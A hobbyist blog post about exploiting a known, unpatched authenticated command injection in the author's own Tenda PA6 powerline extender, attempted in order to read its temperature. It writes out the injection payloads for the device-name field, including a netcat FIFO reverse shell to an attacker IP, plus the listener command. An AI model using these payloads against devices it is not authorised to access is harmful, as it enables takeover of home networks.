So I have a little Tenda PA6 Powerline/HomePlug WiFi extender that I use as an additional WAP in the attic room of my house. This room has been getting very hot recently (around 35Â Â°C), and when I touch the device it feels to be at least 60Â Â°C. Tenda's website says that the PA6 can operate in temperatures up to 40Â Â°C, but I wanted to see if I could get some temperature readings out of the device to see how hot it is actually getting. 

What I should have done here is buying an infrared thermometer, but where is the fun in that?

Conveniently for me, some security researchers from IBM have already made a [pretty comprehensive write-up](https://securityintelligence.com/posts/vulnerable-powerline-extenders-underline-lax-iot-security/) of all the holes in the PA6. In typical vendor fashion, Tenda have not fixed any of these issues in the 3 years since they published the article. The researchers provide 3 exploits for the device, an authed Command Injection, an authed Buffer Overflow, and a pre-auth DoS. As I have the admin password (the default is `admin` ðŸ¤¦), I decided to go with the Command Injection, which I figured would be the easiest to exploit.

{{< image path="tenda-powerline-settings.png" alt="Screenshot of the Powerline settings page on the Tenda PA6" >}}

The Command Injection issue is as basic as it gets. On the device's powerline settings page, you can change the names of the other PLCs on the network. Unfortunately, this name change is done by simply `sprintf`'ing the raw user input into a string, which is then executed as a command on the system, as root. This means you just need to put a little `" ;` in your chosen name, and then you can run any command present on the device. The security researchers don't quite spell out how to exploit this, but even I managed it after a few hours of head scratching.

Conveniently, the PA6 has BusyBox installed, which has a `netcat` binary for us to use --- I found out about this from a [GitHub gist](https://gist.github.com/Weissnix4711/eeb54186469d313d07ffb44d00344a3f) listing all the files in the firmware image. As I wanted a shell on the PA6, we can use `netcat` to pipe a shell session over a TCP socket back to my attacker PC (a reverse shell). 

To do this you first need to spin up a `netcat` listener on your attacker PC, which will listen for incoming connections. I did this with `nc -lvp 4444`. Note in this example my attacker PC has the IP address `192.168.1.100`.

Then we begin to work on the PA6, pasting our commands into one of the PLC device name fields. The version of `nc` on the PA6 doesn't have the convenient `-e` option that handles executing a command for you, so instead we have to do a dance with a named FIFO pipe [^1]. You first paste in:

[^1]: The PA6 uses a very old version of BusyBox, v1.17.2, which was released in August 2010. Weirdly it was compiled 8 years later, on `2018-01-22 01:08:54`. From digging in the source code, it seems the `-e` switch was available in BusyBox v1.17.2's `nc`, but it seems to have been compiled without the `NC_EXTRA` option.

```bash
a" ; mknod /tmp/f p #
```

Here `a` is just a placeholder name. You can then set up the reverse shell by pasting the following into the same field [^2]:

[^2]: You'd normally do this in a single step, but this field only accepts 63 characters. I'm assuming this is just a client side limit, so you could probably sidestep it by sending the request with `curl` or something. 

```bash
a" ; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 4444 >/tmp/f #
```

What we are doing here is passing whatever comes out of the `/tmp/f` pipe into the `stdin` of the shell. We then pipe the `stdout` and `stderr` of the shell into `netcat`, which will send it back to our attacker PC. Finally, we redirect the `stdout` of `netcat` (which is whatever commands we input on the attacker PC), back into the `/tmp/f` pipe. This gives us a poor man's SSH session on the PA6.

`netcat` on your attacker PC should then print some message like:

```bash
Ncat: Connection from 192.168.1.XX.
Ncat: Connection from 192.168.1.XX:XXXXX.

Unfortunately, I couldn't actually find any way of reading any temperature sensors on the device. I tried looking in `/sys/class/thermal`, and a couple of other places, but nothing seemed to present itself. Presumably this SOC just doesn't have any temperature sensors.
